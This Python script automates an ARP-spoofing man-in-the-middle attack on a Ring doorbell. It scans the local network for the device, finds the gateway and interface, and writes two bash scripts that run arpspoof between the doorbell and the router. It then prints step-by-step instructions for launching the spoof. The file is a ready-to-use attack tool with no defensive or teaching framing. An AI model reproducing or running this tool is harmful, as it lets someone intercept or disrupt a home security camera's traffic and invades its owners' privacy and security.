from Pytheas22 import PortScanner
import subprocess
import BetterPrinting as bp
import json
from pathlib import Path

CONFIG_FILE = "config.json"


def get_default_gateway():
    result = subprocess.run(["ip", "route"], capture_output=True, text=True)

    for line in result.stdout.splitlines():
        if line.startswith("default"):
            parts = line.split()
            gateway = parts[2]
            interface = parts[4]
            return gateway, interface

    return None, None


def search_ring_doorbell(devices):
    for device in devices:
        ip, name = device
        if "RingDoorbell" in name:
            return ip
    return None


def create_config():
    if not Path(CONFIG_FILE).exists():
        config = {
            "interface": "",
            "doorbell_ip": "",
            "gateway": ""
        }

        with open(CONFIG_FILE, "w") as f:
            json.dump(config, f, indent=4)


def update_config(interface=None, doorbell_ip=None, gateway=None):
    with open(CONFIG_FILE, "r") as f:
        data = json.load(f)

    if interface:
        data["interface"] = interface

    if doorbell_ip:
        data["doorbell_ip"] = doorbell_ip

    if gateway:
        data["gateway"] = gateway

    with open(CONFIG_FILE, "w") as f:
        json.dump(data, f, indent=4)


def create_script(filename, interface, target, spoof):
    with open(filename, "w") as f:
        f.write(f"""#!/bin/bash

echo "====================================="
echo "   THANK YOU FOR USING PYTHEAS22"
echo "====================================="

echo "{filename} will start in 2 seconds..."
sleep 2

arpspoof -i {interface} -t {target} {spoof}
""")

def main():

    bp.color("\n🔎 Scanning network for Ring Doorbell...\n", "yellow")

    for attempt in range(5):

        devices = PortScanner.get_all_ips_network()
        doorbell_ip = search_ring_doorbell(devices)

        if doorbell_ip:
            bp.color("✔ Ring Doorbell found!", "green")

            gateway, interface = get_default_gateway()

            bp.color(f"\nDoorbell IP : {doorbell_ip}", "cyan")
            bp.color(f"Gateway     : {gateway}", "cyan")
            bp.color(f"Interface   : {interface}\n", "cyan")

            update_config(interface, doorbell_ip, gateway)

            create_script("router.sh", interface, doorbell_ip, gateway)
            create_script("target.sh", interface, gateway, doorbell_ip)

            bp.color("\n=====================================", "green")
            bp.color("HOW TO RUN THE SPOOF", "green")
            bp.color("=====================================\n", "green")

            bp.color("METHOD 1:", "yellow")

            print("""
Open TWO terminals:

Terminal 1:
    bash router.sh

Terminal 2:
    bash target.sh
""")
            bp.color("METHOD 2:", "yellow")
            print("Run the web interface:")
            print("    python app.py\n")
            bp.color("✔ Setup complete.", "green")
            return

        bp.color(f"Attempt {attempt+1}/5 → Doorbell not found...", "red")
    bp.color("\n❌ Ring Doorbell could not be found on the network.", "red")


if __name__ == "__main__":
    create_config()
    main()
